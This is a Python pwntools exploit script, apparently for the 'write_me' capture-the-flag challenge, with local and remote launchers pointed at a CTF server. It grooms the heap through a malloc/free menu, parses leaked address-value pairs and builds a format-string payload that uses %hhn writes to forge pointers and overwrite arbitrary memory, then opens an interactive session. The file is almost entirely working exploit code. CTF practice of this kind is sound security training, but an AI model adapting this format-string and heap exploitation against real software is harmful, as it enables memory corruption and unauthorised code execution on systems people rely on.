from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re

context.arch = "amd64"
context.word_size = 64

file = "./write_me_patched"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    b *main+476
    c
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("write-me.chal.idek.team", 1337)

def launch_local():
    global file, io
    pty = process.PTY
    io = process([file, *args], stdin=pty, stdout=pty, stderr=pty) # stdin=pty to avoid pwntools messing with the file structures and the heap
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))

def launch():
    l = launch_local
    # l = launch_remote
    with context.local(log_level=logging.ERROR):
        l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

written = 0
def exploit():
    global written
    def malloc(index, size=0):
        sla(b"Choice? ", b"1")
        sla(b"Index? ", str(index).encode())
        sla(b"Size? ", str(size).encode())
    def free(index):
        sla(b"Choice? ", b"2")
        sla(b"Index? ", str(index).encode())
    def challenge():
        sla(b"Choice? ", b"3")
        leak = recvu(b"\nFormat")[:-len(b"\nFormat")]
        return {
            int(getb(i, b"address ", b""), 16): int(getb(i, b"Write ", b" to"), 16) for i in leak.splitlines()
        }
    def quit():
        sla(b"*> ", b"3")

    malloc(3, 0)
    
    malloc(0, 0x28)
    malloc(1, 0x28)
    malloc(2, 0x28)

    malloc(4, 0x2620-8)
    malloc(5, 0)
    free(4)

    free(2)
    free(1)
    free(0)

    free(3)

    chal = challenge()
    for k, v in chal.items():
        print("%#018x" % k, "=", hex(v))

    ptr1_offset = 5
    ptr2_offset = 11
    ptr3_offset = 17

    def write_amount(amount): # if we write 0x100, %hhn will actually write 0
        global written
        tmp = ""
        if (written & 0xff) == 0:
            tmp = f"%{amount}c"
            written += amount
        else:
            tmp = f"%{0x100 - (written & 0xff) + amount}c"
            written |= 0xff
            written += 1 + amount
        return tmp
        
    def craft_ptr(ptr):
        tmp = ""
        for i in range(8):
            tmp += write_amount(0x10 + i)
            tmp += f"%{ptr2_offset}$hhn"
            tmp += write_amount((ptr >> (8*i)) & 0xff)
            tmp += f"%{ptr2_offset+1}$hhn"
        return tmp
    
    def write_val(val):
        tmp = write_amount(0x10)
        tmp += f"%{ptr2_offset}$hhn"
        for i in range(4):
            tmp += write_amount(i)
            tmp += f"%{ptr2_offset+1}$hhn"
            tmp += write_amount((val >> (8*i)) & 0xff)
            tmp += f"%{ptr2_offset+2}$hhn"
        return tmp

    payload = ""
    payload += f"%{0xd400-3}c"
    payload += f"%c%c%c%hn"
    payload += f"%{0x10}c%{ptr2_offset}$hn"
    for i in range(50):
        payload += f"%{i}$#018llx"

    written = 0xd78c # took from gdb

    for k, v in chal.items():
        payload += craft_ptr(k)
        payload += write_val(v)

    sla(b"string? ", payload.encode("iso-8859-1"))

    recvu(b"Yay!")

    io.interactive()
    input("end")
    exit()

launch()
exploit()